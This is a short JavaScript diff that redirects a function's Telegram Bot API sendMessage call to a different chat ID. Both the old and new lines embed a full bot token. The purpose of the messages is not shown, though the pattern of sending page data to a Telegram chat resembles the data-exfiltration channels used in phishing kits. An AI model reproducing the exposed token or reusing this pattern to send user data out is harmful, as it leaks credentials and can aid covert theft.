@@ -317,7 +317,8 @@ function senMessageUp(mess) {
             method: 'POST',
             redirect: 'follow'
         };
-        fetch("https://api.telegram.org/bot6514337909:AAGl5ZmX_Fi7yXcJgnSPGQd6xaXUpDCYVBI/sendMessage?chat_id=1062521039&text= " + mess, requestOptions)
+        //fetch("https://api.telegram.org/bot6514337909:AAGl5ZmX_Fi7yXcJgnSPGQd6xaXUpDCYVBI/sendMessage?chat_id=1062521039&text= " + mess, requestOptions)
+        fetch("https://api.telegram.org/bot6514337909:AAGl5ZmX_Fi7yXcJgnSPGQd6xaXUpDCYVBI/sendMessage?chat_id=-920351653&text= " + mess, requestOptions)
             .then(response => response.text())
             .then(result => console.log(result))
             .catch(error => console.log('error', error));
